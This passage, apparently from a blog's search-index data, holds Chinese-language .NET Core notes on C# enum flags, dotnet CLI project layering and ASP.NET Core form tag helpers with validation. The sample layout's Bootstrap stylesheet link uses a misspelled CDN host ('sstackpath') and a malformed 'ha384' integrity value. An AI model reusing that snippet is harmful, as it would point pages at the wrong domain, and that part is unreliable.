msdn.microsoft.com/en-us/library/ms229025(VS.90).aspx – adrian I prefer this definition: “Returns an indication whether a constant with a specified value exists in a specified enumeration” from MSDN 其實我原本都看不太懂。這邊我就去問 AI 大神。 我突然恍然大悟。 Days day = Days.Monday | Days.Thursday; //day.HasFlag(Days.Thursday).Dump(); Enum.IsDefined(typeof(Days),day).Dump(); day.Dump(); [Flags] public enum Days { None, Monday, Tuesday, Wednesday, Thursday, Friday , Saturday, Sunday } 其實[Flags]可以省略，還有我這邊也沒有給數值0,1,2,4,8,16,32,64。因為這樣Enum.IsDefined這會得出錯誤結果。 透過 AI 老師讓我了解這個東西。XD ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:4:0","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"FlagsAttribute 複合屬性 [Flags] public enum Permissions { None = 0, Read = 1, Write = 2, Execute = 4, ReadWrite = Read | Write, // (1|2) =\u003e 1+2 = 3 ReadExecute = Read | Execute, // (1|4) =\u003e 1+4 = 5 WriteExecute = Write | Execute, // (2|4) =\u003e 2+4 = 6 All = Read | Write | Execute // (1|2|4) =\u003e 1+2+4 = 7 } Note 看起來(1|2) 運算很簡單，這邊其實是用2進去去做換算，建議可以去看電子計算機概論就能知道這邊在做什麼。 (1|2) =\u003e 1+2 = 3 這邊做二進位換算 01 =\u003e 1 10 =\u003e 2 -– 11 =\u003e 3 (1|4) =\u003e 1+4 = 5 這邊做二進位換算 001 =\u003e 1 100 =\u003e 4 -– 101 =\u003e 5 AI 給了很棒範例，他也說過1|2等於1+2。這個設計很已把很多狀態融合在一起，這樣一個 Entity 不需要有這麼多狀態欄位，我覺得這個可以用在檔案權限、帳號權限，也可以依照特別物件做設計。 ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:4:1","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"使用 AI 心得 有幾篇看不是很懂，但透過 AI 回答東西，我再去驗證思考過他是否說的是正確，在一部相關文件可能都能對應，畢竟有些是翻譯或語言問題，通常第一眼看可能看不出意思，但透過 AI 說的，我們去重看文章很能就能知道問題了。 ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:5:0","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"其它可參考文章 如何在 C# 中從列舉 Enum 中獲取整型 Int 值 | D棧 - Delft Stack 列舉型別-c # 參考 | Microsoft Docs 上帝的藝術-微軟的神域: C# - 實現Enum多功能的程式技巧 用簡單的方法讓 WebAPI 將 Enum 用自訂的文字輸出 ","date":"2022-12-11","objectID":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/:6:0","tags":[".netcore","enum","csharp"],"title":"C# Enum 小記","uri":"/blog/posts/CSharp-Enum-%E5%B0%8F%E8%A8%98/"},{"categories":[".Net Core"],"content":"什麼是程式分層呢?在平常我們在大專案會做分層，讓程式不會特別亂。當然有些小專案不會這麼複雜，有些公司(優良)可能會用，但有些可能不會特別設定，但正常專案通常都會切。設定這個可能也需要一些編譯程式知識，新手不了解編譯程式相關知識可能會遇到很多問題，我推薦了解再回來看可能會比較懂在做什麼。 ","date":"2022-12-10","objectID":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/:0:0","tags":[".netcore","visualstudio"],"title":"Visual Studio 做 Net Core 專案分層","uri":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/"},{"categories":[".Net Core"],"content":"常見分層 ","date":"2022-12-10","objectID":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/:1:0","tags":[".netcore","visualstudio"],"title":"Visual Studio 做 Net Core 專案分層","uri":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/"},{"categories":[".Net Core"],"content":"MVC 常見的開發模式會切層Model、View、Controller。這邊就不詳細介紹。我第一間公司有分這三層，但這三層寫久了會發現一個問題。Controller 那邊很多方法，寫久了會有後會覺得亂亂的。這時候會有一個概念 Service，通常這個會用來處理商業一些邏輯用，可以讓你的程式共用。 詳細內容推薦看菜雞新訓記 (5): 使用 三層式架構 來切分服務的關注點和職責吧 | 伊果的沒人看筆記本這篇，有很多觀點我覺得作者講的很棒，算是講得滿細，滿多自己的觀點。但大部分方向都是一樣的，有些設計會不太一樣，很多人都不會提到 DTO，但我覺得可以了解 DTO 是做什麼用?可能很多專案 DTO 指的意思都是不一樣東西。 Note 我覺得每個人都有各自想法，但這篇文章真的講滿多的，推薦可以看一下。畢竟我待過每家切的層都不太一樣，可能有些人分資料夾解決，有些會分 Package 再透過專案引入。 我覺得先會怎麼使用，在學要怎麼用才是重要的。不要照教學操作，結果設計不知道要怎麼做就不是很好。就像 GIT 會先學怎麼用，不會一開始去學 GIT Flow 流程。 Note 有些框架 Controller 層不能呼叫 Controller Method，但是有些框架沒有這個問題。像我之前 PHP 框架 Controller 寫上商業邏輯，但是要呼叫之前寫的商業邏輯就沒辦法重複使用，因為 Controller 沒法直接呼叫 Controller Method。所以我認為拆 Service 也是很重要的一件事。 ","date":"2022-12-10","objectID":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/:1:1","tags":[".netcore","visualstudio"],"title":"Visual Studio 做 Net Core 專案分層","uri":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/"},{"categories":[".Net Core"],"content":"DDD 展示層: Web MVC,Web API 應用層: 診對用戶場景、用例設計應用層服務，離底層細節。 領域層: 專注於維護業務規則 基處設施層:負責資料查詢和持久化 最近買中台架構與實現 - 基於 DDD 和微服務書還沒看完，這邊就不說太多。 ","date":"2022-12-10","objectID":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/:1:2","tags":[".netcore","visualstudio"],"title":"Visual Studio 做 Net Core 專案分層","uri":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/"},{"categories":[".Net Core"],"content":"使用 dotnet cli 指令建立分層 發現最近 .Net 專案建置分層很不方便，剛好最近裝 cli 工具嘗試看看。 參考: Visual Studio解决方案中添加src文件夹的方法_vs怎么在解决方案添加文件夹_倾斜的水瓶座的博客-CSDN博客 建立方案資料夾 mkdir solution 建立方案檔案 dotnet new sln ls # 目錄: D:\\Code\\DotNet\\solution # Mode LastWriteTime Length Name # ---- ------------- ------ ---- # -a---- 2023/6/21 下午 10:39 441 solution.sln 建立新的專案(Library) dotnet new classlib -o src/src/solution.Library 方案加入新專案 dotnet sln add .\\src\\solution.Library # 專案 `src\\solution.Library\\solution.Library.csproj` 已新增至解決方案。 接下來 reference project 可以參考dotnet add reference command - .NET CLI | Microsoft Learn。 快速產生 Controller 和 View 可以參考 如何使用 .NET CLI 快速產生 ASP․NET Core 的 Controllers 與 Views 程式碼 | The Will Will Web。 我覺得用 vsCode 好像沒有用 Visual Studio Code 方便。 ","date":"2022-12-10","objectID":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/:2:0","tags":[".netcore","visualstudio"],"title":"Visual Studio 做 Net Core 專案分層","uri":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/"},{"categories":[".Net Core"],"content":"Visual Studio 操作專案分層 ","date":"2022-12-10","objectID":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/:3:0","tags":[".netcore","visualstudio"],"title":"Visual Studio 做 Net Core 專案分層","uri":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/"},{"categories":[".Net Core"],"content":"開始新增另一個專案 這邊開始本篇重頭戲。其實只有兩個步驟。 參考:使用 Visual Studio 建立 .NET 類別庫 - .NET | Microsoft Docs 使用 Visual Studio Code 建立 .NET 類別庫 - .NET | Microsoft Docs ","date":"2022-12-10","objectID":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/:3:1","tags":[".netcore","visualstudio"],"title":"Visual Studio 做 Net Core 專案分層","uri":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/"},{"categories":[".Net Core"],"content":"在主專案依賴另一個專案 管理專案中的參考 - Visual Studio (Windows) | Microsoft Docs 每次都會忘掉怎麼使用，這邊稍微紀錄。 專案下面依賴性右鍵(可參考下面圖片) 新增專案參考 勾選剛剛新增要引入專案 確認就完成匯入 我們這邊發現一件事情，只要依賴別的專案過，其中依賴裡面還有再依賴別的專案，到主專案就不需要再依賴進去。 這邊舉例來說，假如 Web 有用到 Service，再到 Service 有依賴 Common， Web 就不需要再依賴 Common。就算你想點依賴，Visual Studio 也會提示你重複依賴，不給你點下去。這點跟 Java 不太一樣。 Note Java import 一些專案有分編譯時候和執行時候依賴專案來源。所以在有一些古老專案，老專案沒有使用 Maven 和 Gradle 管理工具去控制，但是在 Eclipse 可以手動去依賴，這時候我有看到很多專案都會做 import 動作。 舉個例子，假如 Web 有用到 Service ，再到 Service 有依賴 Common ，Web 還需再依賴 Common ，如果，Web沒依賴 Common 就會錯誤。 切層後的結果 ","date":"2022-12-10","objectID":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/:3:2","tags":[".netcore","visualstudio"],"title":"Visual Studio 做 Net Core 專案分層","uri":"/blog/posts/Visual-Studio-%E5%81%9A-Net-Core-%E5%B0%88%E6%A1%88%E5%88%86%E5%B1%A4/"},{"categories":[".Net Core"],"content":"表單 Taghelper大概有這幾項 Form Tag Helper Input Tag Helper Label Tag Helper Select Tag Helper Textarea Tag Helper Validation Tag Helper ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:0:0","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"表單 ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:1:0","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"前置作業 _layout.cshtml 加入 bootstrap 選單 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta name=\"viewport\" content=\"width=device-width\" /\u003e \u003ctitle\u003e@ViewBag.Title\u003c/title\u003e \u003cenvironment include=\"Development\"\u003e \u003clink href=\"~/lib/bootstrap/dist/css/bootstrap.css\" rel=\"stylesheet\"/\u003e \u003c/environment\u003e \u003cenvironment exclude=\"Development\"\u003e \u003clink rel=\"stylesheet\" integrity=\"ha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\" href=\"https://sstackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" asp-fallback-href=\"~/lib/bootstrap/dist/css/bootstrap.css\" asp-fallback-test-class=\"sr-only\" asp-fallback-test-property=\"position\" asp-fallback-test-value=\"absolute\" asp-suppress-fallback-integrity=\"true\"/\u003e \u003c/environment\u003e \u003c/head\u003e \u003cbody\u003e \u003cnav class=\"navbar navbar-expand-lg navbar-light bg-light\"\u003e \u003cdiv class=\"container\"\u003e \u003ca class=\"navbar-brand\" href=\"#\"\u003eNavbar\u003c/a\u003e \u003cbutton class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"\u003e \u003cspan class=\"navbar-toggler-icon\"\u003e\u003c/span\u003e \u003c/button\u003e \u003cdiv class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"\u003e \u003cul class=\"navbar-nav mr-auto\"\u003e \u003cli class=\"nav-item active\"\u003e \u003ca class=\"nav-link\" asp-controller=\"home\" asp-action=\"index\"\u003e狗清單 \u003c/a\u003e \u003c/li\u003e \u003cli class=\"nav-item\"\u003e \u003ca class=\"nav-link\" asp-controller=\"home\" asp-action=\"create\"\u003e新增狗\u003c/a\u003e \u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e \u003c/div\u003e \u003c/nav\u003e \u003cdiv class=\"container\"\u003e @RenderBody() \u003c/div\u003e @RenderSection(\"Scripts\",required: false) \u003c/body\u003e \u003c/html\u003e 重點說明 @RenderBody() 會載入當下 View 的內容回傳到這個位置。 @RenderSection(\"Scripts\",required: false) 會載入當下 View 自定的@Section Scripts 內容，很適合載入當下頁面需要載入一些js/css，第二個參數假如當前 View 沒定義 @Section Scripts 就會報錯 上面敘述看不懂可以看一下這張圖，來源:c# - Determine what View is going to be rendered in @RenderBody() - Stack Overflow。 推薦可以看認識View - View的種類 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天這篇。 ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:1:1","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"新增表單 在 Controller 建立 Create 方法 public IActionResult Create() { return View(); } 建立 Create View @model WebApplication3.Models.Dog \u003cform asp-controller=\"home\" asp-action=\"create\" method=\"post\"\u003e \u003cdiv class=\"form-group row\"\u003e \u003clabel asp-for=\"Name\" class=\"col-sm-2 col-form-label\"\u003e\u003c/label\u003e \u003cdiv class=\"col-sm-10\"\u003e \u003cinput asp-for=\"Name\" /\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003clabel asp-for=\"Address\" class=\"col-sm-2 col-form-label\"\u003e\u003c/label\u003e \u003cdiv class=\"col-sm-10\"\u003e \u003cinput asp-for=\"Address\" /\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003cbutton class=\"btn btn-primary\"\u003e送出\u003c/button\u003e \u003c/div\u003e \u003c/form\u003e ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:1:2","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"select 選單 建立 enum WebApplication3\\Models\\AddressEnum.cs namespace WebApplication3.Models { public enum AddressEnum { tw, jp, cn, us, } } \u003cdiv class=\"form-group row\"\u003e \u003clabel asp-for=\"Address\"class=\"col-sm-2 col-form-label\" \u003e\u003c/label\u003e \u003cselect asp-for=\"Address\" asp-items=\"Html.GetEnumSelectList\u003cAddressEnum\u003e()\"\u003e\u003c/select\u003e \u003c/div\u003e Html.GetEnumSelectList可參考:HtmlHelper.GetEnumSelectList 方法 (Microsoft.AspNetCore.Mvc.ViewFeatures) | Microsoft Docs 原始碼結果 ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:1:3","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"模型綁定 模型綁定是將 HTTP request 的資料映射到 Controller 操作法法上對應的參數。 操作方法中的參數可以是簡單類別，如整數、字串等，也可以是Class。 程式讀值順序: Form values(表單值) Route values (路由值) Query String (url參數值) ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:2:0","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"IRepository 增加 add 新增public Dog Add(Dog dog); WebApplication3\\Models\\IDogRepository.cs using System.Collections.Generic; namespace WebApplication3.Models { public interface IDogRepository { public Dog getDog(int id); public IEnumerable\u003cDog\u003e GetAllDogs(); public Dog Add(Dog dog); } } 新增這個方法 public Dog Add(Dog dog) { dog.Id = _dogList.Max(s =\u003e s.Id) + 1; _dogList.Add(dog); return dog; } 完整程式碼 WebApplication3\\Models\\MockDogRepository.cs using System.Collections.Generic; using System.Linq; namespace WebApplication3.Models { public class MockDogRepository : IDogRepository { private List\u003cDog\u003e _dogList; public MockDogRepository() { _dogList = new List\u003cDog\u003e() { new Dog(){Id=1,Name =\"dog1\",Address=\"tw\"}, new Dog(){Id=2,Name =\"dog2\",Address=\"tw\"}, new Dog(){Id=3,Name =\"dog2\",Address=\"tw\"}, }; } public Dog Add(Dog dog) { dog.Id = _dogList.Max(s =\u003e s.Id) + 1; _dogList.Add(dog); return dog; } public IEnumerable\u003cDog\u003e GetAllDogs() { return _dogList; } public Dog getDog(int id) { return _dogList.FirstOrDefault(a =\u003e a.Id == id); } } } ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:2:1","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"Controller 建立 Create 增加資料方法(Post) 添加 HttpGet和 HttpPost Attribute 到 Create 方法 RedirectToActionResult 傳回放到 Post Create 方法 RedirectToAction(\"Details\", new { id = newDog.Id }); [HttpGet] public IActionResult Create() { return View(); } [HttpPost] public RedirectToActionResult Create(Dog dog) { Dog newDog = _dogRepostory.Add(dog); return RedirectToAction(\"Details\", new { id = newDog.Id }); } AmbiguousActionException: Multiple actions matched. 遇到這個錯誤不用緊張，是遇到路由重複宣告。這時候標註 HttpGet 和 HttpPost 可以解決這個問題。 ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:2:2","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"模型驗證 表單做簡單基本驗證。 ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:3:0","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"必填(Required) [Required] public string Name { get; set; } 完整程式如下。 using System.ComponentModel.DataAnnotations; namespace WebApplication3.Models { public class Dog { public int Id { get; set; } [Required] public string Name { get; set; } public string Address { get; set; } } } ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:3:1","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"確認驗證是否正確 [HttpPost] public IActionResult Create(Dog dog) { if (ModelState.IsValid) { Dog newDog = _dogRepostory.Add(dog); return RedirectToAction(\"Details\", new { id = newDog.Id }); } return View(); } 完整寫法 using Microsoft.AspNetCore.Mvc; using WebApplication3.Models; using WebApplication3.ViewModels; namespace WebApplication3.Controllers { public class HomeController : Controller { private readonly IDogRepository _dogRepostory; public HomeController(IDogRepository dogRepository) { _dogRepostory = dogRepository; } public IActionResult Index() { var model = _dogRepostory.GetAllDogs(); return View(model); } public IActionResult Details(int? id) { HomeDetailsViewModel homeDetailsViewModel = new HomeDetailsViewModel() { Dog = _dogRepostory.getDog(id??1), PageTitle = \"狗的詳情\" }; return View(homeDetailsViewModel); } [HttpGet] public IActionResult Create() { return View(); } [HttpPost] public IActionResult Create(Dog dog) { if (ModelState.IsValid) { Dog newDog = _dogRepostory.Add(dog); return RedirectToAction(\"Details\", new { id = newDog.Id }); } return View(); } } } ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:3:2","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"新增錯誤訊息 @model WebApplication3.Models.Dog \u003cform asp-controller=\"home\" asp-action=\"create\" method=\"post\"\u003e \u003cdiv asp-validation-summary=\"All\"\u003e\u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003clabel asp-for=\"Name\" class=\"col-sm-2 col-form-label\"\u003e\u003c/label\u003e \u003cdiv class=\"col-sm-10\"\u003e \u003cinput asp-for=\"Name\" class=\"form-control\" /\u003e \u003cspan asp-validation-for=\"Name\"\u003e\u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003clabel asp-for=\"Address\" class=\"col-sm-2 col-form-label\" \u003e\u003c/label\u003e \u003cdiv class=\"col-sm-10\"\u003e \u003cselect asp-for=\"Address\" asp-items=\"Html.GetEnumSelectList\u003cAddressEnum\u003e()\" class=\"form-control\" \u003e\u003c/select\u003e \u003c/div\u003e \u003c/div\u003e \u003cdiv class=\"form-group row\"\u003e \u003cbutton class=\"btn btn-primary\"\u003e送出\u003c/button\u003e \u003c/div\u003e \u003c/form\u003e 重點: \u003cdiv asp-validation-summary=\"All\"\u003e\u003c/div\u003e 錯誤訊息全部顯示在這邊。 新增\u003cspan asp-validation-for=\"Name\"\u003e\u003c/span\u003e顯示單個錯誤訊息在這邊。 ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:3:3","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"定義自訂錯誤訊息 WebApplication3\\WebApplication3\\Models\\Dog.cs using System.ComponentModel.DataAnnotations; namespace WebApplication3.Models { public class Dog { public int Id { get; set; } [Required(ErrorMessage = \"請輸入姓名\")] public string Name { get; set; } public string Address { get; set; } } } ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:4:0","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"其他驗證 [ValidateNever]: Indicates that a property or parameter should be excluded from validation. [CreditCard]: Validates that the property has a credit card format. Requires jQuery Validation Additional Methods. [Compare]: Validates that two properties in a model match. [EmailAddress]: Validates that the property has an email format. [Phone]: Validates that the property has a telephone number format. [Range]: Validates that the property value falls within a specified range. [RegularExpression]: Validates that the property value matches a specified regular expression. [Required]: Validates that the field isn't null. See [Required] attribute for details about this attribute's behavior. [StringLength]: Validates that a string property value doesn't exceed a specified length limit. [Url]: Validates that the property has a URL format. [Remote]: Validates input on the client by calling an action method on the server. See [Remote] attribute for details about this attribute's behavior. 可參考:Model validation in ASP.NET Core MVC | Microsoft Docs Email驗證可以用 [RegularExpression(@\"^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+$\", ErrorMessage = \"郵箱格式不正確\")] 可以參考:Deali-Axy/AspNetCore-Learning-Mvc: ☀AspNetCore學習筆記（Mvc篇），學生管理系統 ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:4:1","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"顯示 label 自訂名稱 WebApplication3\\WebApplication3\\Models\\Dog.cs using System.ComponentModel.DataAnnotations; namespace WebApplication3.Models { public class Dog { public int Id { get; set; } [Display( Name = \"姓名\")] [Required(ErrorMessage = \"請輸入姓名\")] public string Name { get; set; } [Display(Name = \"居住地\")] public string Address { get; set; } } } ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:5:0","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"錯誤訊息累加 可以 Attribute 寫在一起。 [Required(ErrorMessage = \"請輸入姓名\"),MaxLength(30,ErrorMessage =\"姓名不能超過30個字\")] public string Name { get; set; } 也可以分開都能 [Display( Name = \"姓名\")] [Required(ErrorMessage = \"請輸入姓名\")] [MaxLength(30, ErrorMessage = \"姓名不能超過30個字\")] public string Name { get; set; } 發現 .Net Core 還會好心幫你改好 html 東西。 不知道是好事還壞事XD ","date":"2022-12-10","objectID":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/:5:1","tags":[".netcore","helper","csharp","view"],"title":".Net Core 表單 Helper 使用紀錄","uri":"/blog/posts/Net-Core-%E8%A1%A8%E5%96%AE-Helper-%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/"},{"categories":[".Net Core"],"content":"下拉選單文字調整 WebApplication3\\WebApplication3\\Models\\AddressEnum.cs using System.ComponentModel.DataAnnotations; namespace WebApplication3.Models { public enum AddressEnum { [Display(Name = \"台灣\")] tw, [Display(Name = \"日本\")] jp, [Display(Name = \"中國\")] cn, [Display(Name = \"美國\")] us, } } WebApplication3\\WebApplication3\\Models\\Dog.cs using System.ComponentModel.DataAnnotations; namespace WebApplication3.Models { public class Dog { public int Id { get; set; } [Display( Name = \"姓名\")] [Required(ErrorMessage = \"請輸入姓名\")] [MaxLength(30, ErrorMessage = \"姓名不能超過30個字\")] public string Name { get; set; } [Display(Name = \"居住地\")] public AddressEnum Address { get; set; } } } WebApplication3\\Models\\MockDogRepository.cs using System.Collections.Generic; using System.Linq; namespace WebApplication3.Models { public class MockDogRepository : IDogRepository { private List\u003cDog\u003e _dogList; public MockDogRepository() { _dogList = new List\u003cDog\u003e() { new Dog(){Id=1,Name =\"dog1\",Address=AddressEnum.tw}, new Dog(){Id=2,Name =\"dog2\",Address=AddressEnum.tw}, new Dog(){Id=3,Name =\"dog2\",Address=AddressEnum.jp}, }; } public Dog Add(Dog dog) { dog.Id = _dogList.Max(s =\u003e s.Id) + 1; _dogList.Add(dog); return dog; } public IEnumerable\u003cDog\u003e GetAllDogs() { return _dogList; } public Dog getDog(int id) { return _dogList.FirstOrDefault(a =\u003e a.Id == id); } } } 我們這邊加個請選擇選項。 \u003cdiv class=\"form-group row\"\u003e 